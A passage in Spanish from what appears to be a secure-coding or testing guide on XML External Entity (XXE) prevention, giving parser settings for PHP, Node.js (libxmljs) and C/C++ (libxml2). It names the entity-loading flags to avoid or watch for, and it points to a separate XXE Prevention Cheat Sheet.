  • PHP: en PHP 8.0+, libxml_disable_entity_loader() está obsoleta y es en gran medida innecesaria: PHP ahora requiere libxml >= 2.9.0, que deshabilita por defecto la sustitución de entidades externas, por lo que un análisis estándar basado en DOMDocument/SimpleXML/libxml en una versión actual de PHP no es explotable mediante la vía clásica de entidades a menos que el código la rehabilite explícitamente (p. ej., mediante LIBXML_NOENT combinado con LIBXML_DTDLOAD). Por lo tanto, los evaluadores deben buscar indicadores explícitos de reactivación en PHP moderno en lugar de asumir que el framework necesita una llamada de desactivación; en PHP < 8.0 con libxml más antiguo, la llamada de desactivación sigue siendo necesaria. En cualquier caso, trate por separado las funcionalidades de carga de archivos/conversión de documentos que llaman a bibliotecas de terceros, ya que estas pueden incluir su propio analizador configurado de forma diferente.
  • Node.js: para el análisis basado en libxmljs, nunca establezca noent: true con entradas no confiables; prefiera omitir la opción (o establecerla en false) y combínela con nonet: true para bloquear también la resolución de entidades basada en la red.
  • C/C++ (libxml2): evite las opciones que habilitan la carga de red/entidades (p. ej., XML_PARSE_NOENT, XML_PARSE_DTDLOAD) a menos que sean explícitamente necesarias.

Para fragmentos de configuración autorizados y específicos de cada analizador, remítase a la XML External Entity (XXE) Prevention Cheat Sheet, que se mantiene por separado y se actualiza a medida que cambia el comportamiento de los analizadores.
